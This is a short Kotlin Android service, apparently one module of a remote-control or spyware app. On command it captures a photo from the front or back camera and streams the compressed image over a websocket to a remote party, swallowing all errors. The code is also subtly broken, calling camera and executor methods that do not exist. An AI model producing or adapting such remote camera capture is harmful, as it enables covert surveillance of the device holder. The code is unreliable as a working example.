kotlin
package com.svc.core
import android.app.*
import android.content.Intent
import android.graphics.*
import android.os.*
import androidx.camera.core.*
import androidx.lifecycle.LifecycleService
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors

class Cam : LifecycleService() {
    private var cam: Camera? = null
    private var ex: ExecutorService? = null
    private var mode = "f"

    override fun onCreate() {
        super.onCreate()
        startForeground(3, Notification.Builder(this, "svc")
            .setContentTitle("מצלמה").setSmallIcon(android.R.drawable.ic_menu_camera).build())
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        super.onStartCommand(i, f, s)
        mode = i?.getStringExtra("mode") ?: "f"
        ex = Executors.newSingleThreadExecutor()
        bind()
        return START_NOT_STICKY
    }

    private fun bind() {
        val fut = ProcessCameraProvider.getInstance(this)
        fut.addListener({
            try {
                val p = fut.get()
                val sel = if (mode == "b") CameraSelector.DEFAULT_BACK_CAMERA
                          else CameraSelector.DEFAULT_FRONT_CAMERA
                val cap = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                p.unbindAll()
                cam = p.bindToLifecycle(this, sel, cap)
                shoot(cap)
            } catch (_: Exception) {}
        }, ContextCompat_main())
    }

    private fun shoot(cap: ImageCapture) {
        ex?.execute {
            try {
                val img = cap.takePicture(ImageCapture.OutputFileOptions
                    .Builder(java.io.File(cacheDir, "c.jpg")).build()).get()
                val bmp = BitmapFactory.decodeFile(java.io.File(cacheDir, "c.jpg").absolutePath) ?: return@execute
                val sc = Bitmap.createScaledBitmap(bmp, 900, 900 * bmp.height / bmp.width, true)
                val bos = ByteArrayOutputStream()
                sc.compress(Bitmap.CompressFormat.JPEG, 70, bos)
                val tag: Byte = if (mode == "b") 2 else 1
                Ctx.ws?.send(okhttp3.ByteString.of(byteArrayOf(tag) + bos.toByteArray()))
            } catch (_: Exception) {
            } finally {
                android.os.Handler(mainLooper).postDelayed({ stopSelf() }, 500)
            }
        }
    }

    private fun ContextCompat_main() = android.os.Handler(mainLooper).asRunnableExecutor()
}
